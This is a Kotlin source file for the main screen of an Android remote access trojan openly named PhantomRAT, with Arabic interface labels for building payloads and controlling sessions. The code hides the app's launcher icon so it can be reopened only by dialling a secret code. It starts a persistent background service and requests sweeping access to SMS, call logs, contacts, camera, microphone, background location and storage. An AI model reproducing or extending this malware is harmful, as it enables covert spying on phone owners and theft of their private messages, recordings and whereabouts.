package com.phantom.rat.ui

import android.content.Intent
import android.os.Build
import android.os.Bundle
import android.view.View
import android.view.WindowManager
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import androidx.core.content.ContextCompat
import androidx.viewpager2.widget.ViewPager2
import com.google.android.material.tabs.TabLayout
import com.google.android.material.tabs.TabLayoutMediator
import com.google.android.material.card.MaterialCardView
import com.google.android.material.dialog.MaterialAlertDialogBuilder
import com.google.android.material.snackbar.Snackbar
import com.phantom.rat.R
import com.phantom.rat.core.SessionManager
import com.phantom.rat.services.CoreService

class MainActivity : AppCompatActivity() {

    private lateinit var viewPager: ViewPager2
    private lateinit var tabLayout: TabLayout
    private lateinit var sessionManager: SessionManager

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        
        // Fake activity detection bypass
        if (intent?.hasExtra("launch_admin") == true) {
            startActivity(Intent(this, AdminActivity::class.java))
            finish()
            return
        }
        
        setContentView(R.layout.activity_main)
        
        // Keep screen on during testing
        window.addFlags(WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON)
        
        sessionManager = SessionManager(this)
        
        setupViewPager()
        setupFab()
        startCoreService()
        requestPermissions()
    }

    private fun setupViewPager() {
        viewPager = findViewById(R.id.viewPager)
        tabLayout = findViewById(R.id.tabLayout)
        
        val adapter = MainPagerAdapter(this)
        viewPager.adapter = adapter
        
        TabLayoutMediator(tabLayout, viewPager) { tab, position ->
            when (position) {
                0 -> {
                    tab.text = "🏠 الرئيسية"
                    tab.icon = ContextCompat.getDrawable(this, R.drawable.ic_home)
                }
                1 -> {
                    tab.text = "🎯 البناء"
                    tab.icon = ContextCompat.getDrawable(this, R.drawable.ic_build)
                }
                2 -> {
                    tab.text = "👥 الجلسات"
                    tab.icon = ContextCompat.getDrawable(this, R.drawable.ic_sessions)
                }
                3 -> {
                    tab.text = "⚙️ التحكم"
                    tab.icon = ContextCompat.getDrawable(this, R.drawable.ic_control)
                }
                4 -> {
                    tab.text = "🔧 الإعدادات"
                    tab.icon = ContextCompat.getDrawable(this, R.drawable.ic_settings)
                }
            }
        }.attach()
    }

    private fun setupFab() {
        findViewById<View>(R.id.fab_hide_app).setOnClickListener {
            hideAppLauncher()
        }
    }

    private fun hideAppLauncher() {
        try {
            packageManager.setComponentEnabledSetting(
                componentName,
                android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                android.content.pm.PackageManager.DONT_KILL_APP
            )
            Snackbar.make(
                findViewById(android.R.id.content),
                "✅ تم إخفاء التطبيق - افتحه من الاتصال برقم $SECRET_CODE",
                Snackbar.LENGTH_LONG
            ).show()
        } catch (e: Exception) {
            Toast.makeText(this, "خطأ: ${e.message}", Toast.LENGTH_SHORT).show()
        }
    }

    private fun startCoreService() {
        val intent = Intent(this, CoreService::class.java)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(intent)
        } else {
            startService(intent)
        }
    }

    private fun requestPermissions() {
        val permissions = mutableListOf(
            android.Manifest.permission.INTERNET,
            android.Manifest.permission.READ_SMS,
            android.Manifest.permission.RECEIVE_SMS,
            android.Manifest.permission.READ_CALL_LOG,
            android.Manifest.permission.READ_CONTACTS,
            android.Manifest.permission.CAMERA,
            android.Manifest.permission.RECORD_AUDIO,
            android.Manifest.permission.ACCESS_FINE_LOCATION,
            android.Manifest.permission.ACCESS_BACKGROUND_LOCATION,
            android.Manifest.permission.FOREGROUND_SERVICE,
            android.Manifest.permission.POST_NOTIFICATIONS
        )
        
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            permissions.add(android.Manifest.permission.MANAGE_EXTERNAL_STORAGE)
        } else {
            permissions.add(android.Manifest.permission.WRITE_EXTERNAL_STORAGE)
            permissions.add(android.Manifest.permission.READ_EXTERNAL_STORAGE)
        }
        
        requestPermissions(permissions.toTypedArray(), 1001)
    }

    private fun showExitDialog() {
        MaterialAlertDialogBuilder(this)
            .setTitle("🧬 PhantomRAT")
            .setMessage("هل تريد إخفاء التطبيق؟")
            .setPositiveButton("إخفاء") { _, _ -> hideAppLauncher() }
            .setNegativeButton("إلغاء", null)
            .show()
    }

    override fun onBackPressed() {
        showExitDialog()
    }

    companion object {
        const val SECRET_CODE = "*#1234#"
    }
}
